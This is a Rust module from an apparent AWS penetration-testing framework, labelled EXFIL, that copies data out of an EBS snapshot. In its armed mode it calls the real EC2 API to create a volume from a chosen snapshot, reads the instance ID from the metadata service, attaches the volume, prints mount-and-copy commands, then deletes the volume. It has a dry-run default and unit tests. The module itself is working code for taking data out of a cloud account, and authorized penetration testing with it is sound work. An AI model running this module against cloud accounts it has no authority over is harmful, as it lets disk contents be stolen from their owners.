//! ebs__download_snapshots — exfil an EBS snapshot (EXFIL, requires --armed).
//!
//! Args:
//!   --snapshot-id <snap_id>   target snapshot ID (required)
//!   --region <region>         region where the snapshot lives (optional override)
//!
//! Dry-run mode (default): prints the exact AWS CLI / SDK calls that would
//! be executed and leaves nothing behind.
//!
//! Armed mode: calls CreateVolume → AttachVolume, then instructs the operator
//! to mount and copy the data manually, then calls DeleteVolume on confirmation.
//!
//! NOTE: Full IMDS + filesystem-mount automation is intentionally out of scope.
//! The dry-run output is the primary value of this module.

use anyhow::Context as _;
use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let snapshot_id: Option<&str> = {
        let pos = args.iter().position(|&a| a == "--snapshot-id");
        pos.and_then(|i| args.get(i + 1).copied())
    };

    let region_override: Option<&str> = {
        let pos = args.iter().position(|&a| a == "--region");
        pos.and_then(|i| args.get(i + 1).copied())
    };

    let snap_id = match snapshot_id {
        Some(id) => id,
        None => {
            anyhow::bail!("--snapshot-id <snap_id> is required");
        }
    };

    // ── Dry-run mode (default unless armed) ───────────────────────────────
    if !ctx.armed {
        let az = region_override
            .map(|r| format!("{r}a"))
            .unwrap_or_else(|| "<your-az>".to_owned());

        println!("{}", "[DRY-RUN] Would execute:".cyan().bold());
        println!(
            "  1. aws ec2 create-volume --snapshot-id {} --availability-zone {}",
            snap_id.yellow(),
            az.yellow()
        );
        println!("  2. aws ec2 attach-volume --volume-id <vol_id> --instance-id <this_instance> --device /dev/xvdf");
        println!("  3. sudo mount /dev/xvdf /mnt/ebs-dump && sudo cp -r /mnt/ebs-dump ./snapshot-dump/");
        println!("  4. aws ec2 delete-volume --volume-id <vol_id>");
        println!(
            "\n{}",
            "Run with --armed to execute CreateVolume and AttachVolume via the AWS SDK.".yellow()
        );
        return Ok(());
    }

    // ── Armed mode ────────────────────────────────────────────────────────
    println!(
        "{}",
        "[ARMED] ebs__download_snapshots — executing real API calls.".red().bold()
    );
    println!(
        "{}",
        "    CloudTrail will record these actions.".red()
    );

    let ec2 = aws_sdk_ec2::Client::new(&ctx.sdk_config);

    // Determine availability zone from snapshot or use override
    let snap_resp = ec2
        .describe_snapshots()
        .snapshot_ids(snap_id)
        .send()
        .await
        .context("ec2:DescribeSnapshots failed")?;

    let snap = snap_resp
        .snapshots()
        .first()
        .ok_or_else(|| anyhow::anyhow!("Snapshot {snap_id} not found"))?;

    // Determine an AZ: prefer region_override + "a", else fallback
    let az = if let Some(r) = region_override {
        format!("{r}a")
    } else {
        // Try to infer from current region in SDK config
        let region = ctx
            .sdk_config
            .region()
            .map(|r| r.as_ref().to_owned())
            .unwrap_or_else(|| "us-east-1".to_owned());
        format!("{region}a")
    };

    println!(
        "  {} CreateVolume from {} in {}…",
        "EXEC".red().bold(),
        snap_id.yellow(),
        az.yellow()
    );

    let vol_resp = ec2
        .create_volume()
        .snapshot_id(snap_id)
        .availability_zone(&az)
        .send()
        .await
        .context("ec2:CreateVolume failed")?;

    let volume_id = vol_resp
        .volume_id()
        .ok_or_else(|| anyhow::anyhow!("CreateVolume returned no volume_id"))?
        .to_owned();

    println!(
        "  {} Volume created: {}",
        "OK".green().bold(),
        volume_id.green()
    );

    println!(
        "  {} AttachVolume {}…",
        "EXEC".red().bold(),
        volume_id.yellow()
    );

    // Get instance ID via IMDS (best-effort; we skip if unavailable)
    let instance_id = get_imds_instance_id().await.unwrap_or_else(|| {
        eprintln!(
            "{}",
            "Warning: IMDS unavailable — cannot auto-detect instance ID.".yellow()
        );
        "<instance-id>".to_owned()
    });

    if instance_id == "<instance-id>" {
        // Cannot attach without instance ID; print instructions
        println!(
            "\n{}",
            "Manual step required — IMDS not available from this host:".yellow()
        );
        println!(
            "  aws ec2 attach-volume --volume-id {} --instance-id <YOUR_INSTANCE_ID> --device /dev/xvdf",
            volume_id.yellow()
        );
    } else {
        ec2.attach_volume()
            .volume_id(&volume_id)
            .instance_id(&instance_id)
            .device("/dev/xvdf")
            .send()
            .await
            .context("ec2:AttachVolume failed")?;

        println!(
            "  {} Volume attached to instance {}",
            "OK".green().bold(),
            instance_id.green()
        );
    }

    println!(
        "\n{}",
        "Manual step: mount the volume and copy data:".yellow().bold()
    );
    println!("  sudo mount /dev/xvdf /mnt/ebs-dump");
    println!("  sudo cp -r /mnt/ebs-dump ./snapshot-dump/");
    println!("  sudo umount /mnt/ebs-dump");
    println!("\nPress ENTER when done to proceed with cleanup (DeleteVolume)…");

    // Read confirmation from stdin (blocking)
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).ok();

    println!(
        "  {} DeleteVolume {}…",
        "EXEC".red().bold(),
        volume_id.yellow()
    );

    // Detach before deleting — best effort
    let _ = ec2
        .detach_volume()
        .volume_id(&volume_id)
        .send()
        .await;

    // Wait briefly for detachment
    tokio::time::sleep(std::time::Duration::from_secs(5)).await;

    ec2.delete_volume()
        .volume_id(&volume_id)
        .send()
        .await
        .context("ec2:DeleteVolume failed")?;

    println!(
        "  {} Volume {} deleted.",
        "OK".green().bold(),
        volume_id.green()
    );

    // Suppress unused variable warning for snap — we use it to verify existence.
    let _ = snap;

    Ok(())
}

// ---------------------------------------------------------------------------
// IMDS helper
// ---------------------------------------------------------------------------

/// Try to retrieve the current EC2 instance ID from IMDS (v2).
/// Returns None if not running on an EC2 instance or if IMDS is unreachable.
async fn get_imds_instance_id() -> Option<String> {
    use aws_config::imds::client::Client as ImdsClient;

    let client = ImdsClient::builder().build();

    let id = client
        .get("/latest/meta-data/instance-id")
        .await
        .ok()?;

    let id_str = id.as_ref().to_owned();
    if id_str.starts_with("i-") {
        Some(id_str)
    } else {
        None
    }
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "ebs__download_snapshots",
            author: "lancer-pacu",
            category: "EXFIL",
            one_liner: "Create a volume from a snapshot and attach it. Requires --armed. Dry-run by default.",
            services: &["EC2", "EBS"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    /// Module is registered in the inventory.
    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "ebs__download_snapshots");
        assert!(found, "ebs__download_snapshots not found in inventory");
    }

    /// Category is EXFIL.
    #[test]
    fn module_category_is_exfil() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "ebs__download_snapshots")
            .expect("ebs__download_snapshots not found");
        assert_eq!(m.info.category, "EXFIL");
    }

    /// Missing --snapshot-id returns an error.
    #[tokio::test]
    async fn missing_snapshot_id_returns_error() {
        // Build a minimal AwsContext without real credentials — we only need
        // to exercise the argument-parsing path, which fails before any SDK call.
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &[]).await;
        assert!(result.is_err(), "expected error when --snapshot-id is missing");
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("--snapshot-id"), "error should mention --snapshot-id: {msg}");
    }
}
